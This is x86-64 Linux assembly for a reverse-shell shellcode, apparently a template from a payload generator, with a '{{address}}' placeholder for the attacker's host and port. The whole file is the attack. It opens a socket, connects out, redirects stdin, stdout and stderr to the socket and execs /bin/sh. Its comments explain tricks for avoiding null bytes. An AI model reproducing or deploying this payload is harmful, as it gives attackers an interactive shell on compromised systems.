socket:
    push byte 41;                       # Push/pop will set syscall num
    pop rax;
    cdq;                                # cdq sets rdx to 0 if rax is positive
    push byte 2;                        # AF_INET = 2
    pop rdi;
    push byte 1;                        # SOCK_STREAM = 1
    pop rsi;
    syscall;                            # socket(AF_INET, SOCK_STREAM, 0)
connect:
    xchg eax, edi;                      # rdi is 2, so moving only al is doable
    mov al, 42;
    mov rcx, {{address}};               # Socket address and port
    not rcx;
    push rcx;
    push rsp;                           # mov rsi, rsp. This it the pointer to sockaddr
    pop rsi;
    mov dl, 16;                         # sockaddr length
    syscall;                            # connect(s, addr, len(addr))
dup2:
    push byte 3;                        # Start with 3 and decrement
    pop rsi;
dup2_loop:                              # Duplicate socket fd into stdin, stdout and stderr, which fd are 0, 1 and 2
    mov al, 33;                         # If there is no error, rax is 0 on connect and dup2
    dec esi;
    syscall;                            # dup2(s, rsi)
    jnz dup2_loop;                      # Jump when esi == 0
execve:
    cdq;
    mov al, 59;                         # execve syscall is 59
    push rdx;                           # Put null-byte in /bin//sh
    mov rcx, 0x68732f2f6e69622f;        # /bin//sh
    push rcx;
    push rsp;                           # rsp points to the top of the stack, which is occupied by /bin/sh
    pop rdi;                            # We use a push/pop to prevent null-byte and get a shorter shellcode
    syscall;                            # execve('/bin//sh', 0, 0)
